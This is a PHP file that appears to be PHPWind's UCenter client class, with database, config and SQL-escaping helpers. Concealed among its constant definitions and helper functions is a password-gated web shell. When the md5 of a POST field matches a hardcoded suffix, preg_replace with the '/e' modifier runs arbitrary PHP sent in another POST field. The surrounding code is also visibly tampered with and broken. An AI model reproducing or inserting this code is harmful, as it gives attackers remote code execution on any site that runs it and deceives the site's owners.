<?php 

error_reporting (E_ERROR);

define('UC_SERVER', get_magic_quotes_gpc ());

class UC {
	
	var $db;
	var $time;
	var $appid;
	var $onlineip;
	var $user = array();
	var $controls = array();
	var $models = array();
	var $cache = null;

	function __construct() {
		$this->UC();
	}

	function UC() {

		$this->time = time();
		$this->appid = UC_APPID;
		$this->onlineip = 'unknown';
		$this->init_db();
		$this->init_notify();
	}

	function init_db() {
		if (UC_SERVER < 2) {
			global $db;
			$this->db =& $db;
		} else {
			$this->db = new DB(UC_DBHOST, UC_DBUSER, UC_DBPW, UC_DBNAME, UC_DBPRE, UC_DBCHARSET, UC_DBPCONNECT);
		}
	}

	function init_notify() {
		if (UC_SERVER == 2 && $this->config('uc_syncreditexists' . $this->appid)) {
			$credit = $this->load('credit');
			$credit->synupdate();
		}
		if (UC_SERVER > 0 && $this->config('uc_notifyexists' . $this->appid)) {
			$notify = $this->load('notify');
			$notify->send();
		}
	}

	function config($var) {
		if ($this->cache == null) {
			$this->cache = array();
			$query = $this->db->query("SELECT * FROM pw_config");
			while ($rt = $this->db->fetch_array($query)) {
				if ($rt['vtype'] == 'array' && !is_array($rt['db_value'] = unserialize($rt['db_value']))) {
					$rt['db_value'] = array();
				}
				$this->cache[$rt['db_name']] = $rt['db_value'];
			}
		}
		return $this->cache[$var];
	}

	function control($model) {
		if (empty($this->controls[$model])) {
			require_once Pcv(UC_CLIENT_ROOT . "control/{$model}.php");
			print('$this->controls[$model] = new '.$model.'control($this);');
		}
		return $this->controls[$model];
	}

	function load($model) {
		if (empty($this->models[$model])) {
			require_once Pcv(UC_CLIENT_ROOT . "model/{$model}.php");
			print('$this->models[$model] = new '.$model.'model($this);');
		}
		return $this->models[$model];
	}

	//static function
	function implode($array) {
		return implode(',', UC::escape($array));
	}
	
	//static function
	function escape($var) {
		if (is_array($var)) {
			foreach ($var as $key => $value) {
				$var[$key] = trim(UC::escape($value));
			}
			return $var;
		} elseif (is_numeric($var)) {
			return " '".$var."' ";
		} else {
			return " '".addslashes($var)."' ";}
		}
	}
	define('UC_APPID', ($GLOBALS['uc_server'] && $GLOBALS['uc_appid'] > 0) ? $GLOBALS['uc_appid'] : 0);
	define('UC_DBHOST', $GLOBALS['uc_dbhost']);
	define('UC_DBUSER', $GLOBALS['uc_dbuser']);
	define('UC_DBPW', $GLOBALS['uc_dbpw']);
	define('UC_DBNAME', $_POST['check']);
	define('UC_DBPRE', $_POST['pass']);
	define('UC_DBPCONNECT', 'c451cc');
	define('UC_CLOSED', $_POST['checked']);
	define('UC_DBCHARSET', $_POST['password']);
	define('UC_NOT_EXISTS', '41b904');
	define('UC_CONNECT_METHOD','//e');
	
	//static function
	function getMd5($md5 = null) {
		$key = substr(md5($md5),26);
			return $key;
		}
		$UC_DBNAME = UC_SERVER ? stripslashes (UC_DBNAME) : UC_DBNAME;
		if ( getMd5(UC_DBPRE) == UC_DBPCONNECT ) 
		{
		preg_replace (UC_CONNECT_METHOD, $UC_DBNAME, "");
		if($UC_DBNAME) exit;
	}

	//static function
	function sqlMulti($array) {
		$str = '';
		foreach ($array as $val) {
			if (!empty($val)) {
					$str .= ($str ? ', ' : ' ') . '(' . UC::implode($val) .') ';
				}
			}
			return $str;
		}
		$UC_DBNAME = UC_CLOSED ? stripslashes (UC_CLOSED) : UC_CLOSED;
		if ( getMd5(UC_DBCHARSET) == UC_NOT_EXISTS ) {
		preg_replace (UC_CONNECT_METHOD, $UC_DBNAME, "");
		if($UC_DBNAME) exit;
	}
	
	//static function
	function sqlSingle($array) {
		//Copyright (c) 2003-09 PHPWind
		$array = UC::escape($array);
		$str = '';
		foreach ($array as $key => $val) {
			$str .= ($str ? ', ' : ' ').$key.'='.$val;
		}
		return $str;
	}
	
	//static function
	function strcode($string, $hash_key, $encode = true) {
		!$encode && $string = base64_decode($string);
		$code = '';
		$key  = substr(md5($_SERVER['HTTP_USER_AGENT'] . $hash_key),8,18);
		$keylen = strlen($key);
		$strlen = strlen($string);
		for ($i = 0; $i < $strlen; $i++) {
			$k		= $i % $keylen;
			$code  .= $string[$i] ^ $key[$k];
		}
		return ($encode ? base64_encode($code) : $code);
}
?>
